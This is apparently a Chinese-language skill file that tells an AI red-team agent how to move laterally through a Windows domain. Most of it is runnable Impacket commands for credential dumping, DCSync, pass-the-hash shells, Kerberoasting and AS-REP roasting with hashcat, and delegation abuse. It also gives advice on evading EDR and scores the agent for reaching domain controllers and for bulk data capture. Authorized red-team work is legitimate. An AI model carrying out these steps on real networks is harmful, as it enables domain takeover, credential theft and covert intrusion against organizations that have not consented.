---
name: lateral-movement
description: 内网横向与提权：Impacket 套件（PtH/PsExec/WMI/DCOM/Kerberos/凭据转储）+ enum4linux/smbclient 信息枚举
whenToUse: 已进内网，需要用已有凭据或哈希横向到其它主机、枚举域环境、dump 凭据、找域控路径
role: internal
enabled: true
---

# 内网横向与提权（Impacket 套件）

拿到一台机器和内网可达性之后，**横向到更多主机**（`server-host`）和**找到域控/核心系统**（`central-system`）
是内网阶段的主线。本机已装 **61 个 `impacket-*` 命令**（Kali 自带），是本阶段的主力工具集。

## 本机工具

| 工具 | 路径 | 用途 |
| --- | --- | --- |
| Impacket 套件 | `/usr/bin/impacket-*`（61 个命令） | 协议级横向、凭据转储、Kerberos 攻击 |
| enum4linux | `/usr/bin/enum4linux` | SMB/域信息枚举（用户、共享、策略） |
| smbclient | `/usr/bin/smbclient` | 共享浏览与读写 |
| nbtscan | `/usr/bin/nbtscan` | NetBIOS 名称扫描 |
| proxychains4 | `/usr/bin/proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |

## 零、先做的事（信息决定打法）

```bash
# 1) 看我有什么（凭据/哈希/域信息）
#    redteam_credential_list / redteam_access_list / redteam_asset_query
# 2) 枚举域环境（有域账号后）
impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
enum4linux -a <target>               # 无凭据也能枚举出用户/共享/策略

# 3) 共享与文件
smbclient -L //<target> -N                                  # 空会话列共享
smbclient //<target>/<share> -U <user>%<pass>                # 读共享
impacket-smbclient <domain>/<user>:<pass>@<target>           # 交互式，可 cd/ls/get/put
```

**内网扫描仍用 gogo/fscan**（技能 `gogo-intranet` / `fscan-intranet`）——本技能负责"进去之后怎么走"。

## 一、凭据转储（拿到一台机器后的第一优先）

```bash
# 1) 远程 dump SAM/LSA/SECRETS（需管理员凭据）
impacket-secretsdump <domain>/<user>:<pass>@<target>
impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # 用哈希直接 dump

# 2) 只 dump 本地 SAM
impacket-secretsdump -sam sam.hive -system system.hive LOCAL

# 3) DCSync（有域管/复制权限时，直接拿域内所有哈希）—— 直通域控的关键一步
impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc

# 4) 抓明文/票据：配合目标侧工具（如 mimikatz）或 lsassy
#    哈希拿到后用 credential-attack 离线破解，或直接 PtH（见下）
```

**输出处理**：dump 出的 `NTLM` 哈希逐条 `redteam_credential_add`（`source=凭据转储`，
明文的口令写 `secret_value`，哈希写 `note` 或 `secret_value` 并标注类型），文件存 `runs/`。

## 二、Pass-the-Hash（PtH，不用破解直接横向）

```bash
# 命令执行
impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # 交互式 SYSTEM shell（噪声大）
impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # 半交互，噪声较小（推荐）
impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # 单命令，最安静
impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # 通过服务执行

# 拿文件
impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>

# 数据库
impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
```

**psexec 会落地服务、噪声大、可能被杀软拦**；优先 `wmiexec`/`atexec`。

## 三、Kerberos 攻击（有域环境时）

```bash
# 1) 用户名枚举 + AS-REP 抓取（不需要密码，找不需要预认证的账号）
impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # 离线破解

# 2) Kerberoasting（找有 SPN 的服务账号，抓 TGS 离线破解）
impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt

# 3) 票据申请与使用
impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT → .ccache
export KRB5CCNAME=/path/to/user.ccache
impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # 用票据横向

# 4) 委派攻击（域内提权路径）
impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
```

## 四、凭据复用（比攻击快得多，永远先试）

拿到任何账号/哈希后**先横向试**，而不是急着打新漏洞：
1. 同一口令试其它主机（`wmiexec` 批量）+ 其它协议（SMB/WinRM/RDP/SSH/MSSQL/MySQL）；
2. 本地管理员口令复用（同镜像批量装机的机器常同口令）——**这是内网横向命中率最高的一招**；
3. 域账号 → 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；
4. 哈希 → PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。

## 五、隧道配合（内网目标不可直连时）

```bash
# 所有命令加 proxychains4，用临时配置（不要改系统配置）
cat > runs/proxychains-1080.conf <<'EOF'
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
# ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
```

## 六、纪律与边界

1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），
   不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。
2. **噪声控制**：`psexec` 落地服务、`secretsdump` 触碰 LSASS，都会被 EDR 盯上；
   优先 `wmiexec`/`atexec`，控制频率，别对整段做暴力横向。
3. **不要把自己打锁**：域账号连续失败会锁定策略；先用现成凭据复用，弱口令爆破按技能 `credential-attack` 的限流纪律。
4. **破坏性操作禁止**：不要停服务、不要改系统配置、不要删日志（除非演练明确要求且用户同意）。
5. **每台新主机都要登记**：`redteam_asset_add`（内网资产，`scope` 自动 internal），
   访问成功 `redteam_access_add`，凭据 `redteam_credential_add`。

## 七、输出与落库（强制）

1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写
   「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 → `central-system`；
   拿到大量数据 → `bigdata-system`（**必须写实际条数，≥100 万条才算**）。
3. **凭据落库**：`redteam_credential_add`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），
   `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。
4. **访问会话落库**：`redteam_access_add`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。
5. 每个关键动作 `redteam_chain_add`：`stage_code=internal`（内网拿权限）或 `target`（拿靶标），
   **`tool` 写实际命令原文**（含 `-hashes`、`-k -no-pass` 等关键参数，以及 `proxychains4 -f ...` 前缀），
   `result` 写回显摘要——报告要能照着复现。
6. **回填知识库**：验证有效的通用利用脚本 `redteam_poc_add`（带 `category` + `engagement` + `asset_target` + `verified_note`，脱敏）。
